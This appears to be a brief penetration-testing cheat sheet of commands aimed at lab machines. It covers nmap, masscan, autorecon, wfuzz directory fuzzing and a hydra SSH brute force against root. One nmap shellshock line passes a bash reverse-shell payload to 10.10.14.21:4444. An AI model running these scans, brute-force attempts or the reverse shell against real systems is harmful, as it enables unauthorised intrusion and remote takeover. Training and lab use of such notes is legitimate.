###
```
sudo nmap -sV -sC -oA ip 
sudo nmap --script vuln -oA vuln-scan 10.10.10.79
sudo nmapAutomater
sudo autorecon
https://www.stationx.net/nmap-cheat-sheet/
```
```
root@kali:~# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 15 http://10.10.66.89:8081/FUZZ

```
```
 python autorecon.py 192.168.29.136 -o 192.168.29.136-2nd --nmap "-p 18080,54445,40873,28022,27017"   
sudo nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh,cmd=bin/bash /bin/bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" 10.129.1.175
```
```
sudo masscan -p1-65535,U:1-65535 10.10.10.161 --rate=1000 -e tun0
```
### hydra
```
sudo  hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
 ```

https://www.stationx.net/nmap-cheat-sheet/
### Vuln
```
sudo nmap --script vuln -oA vuln-scan 10.10.10.79

```
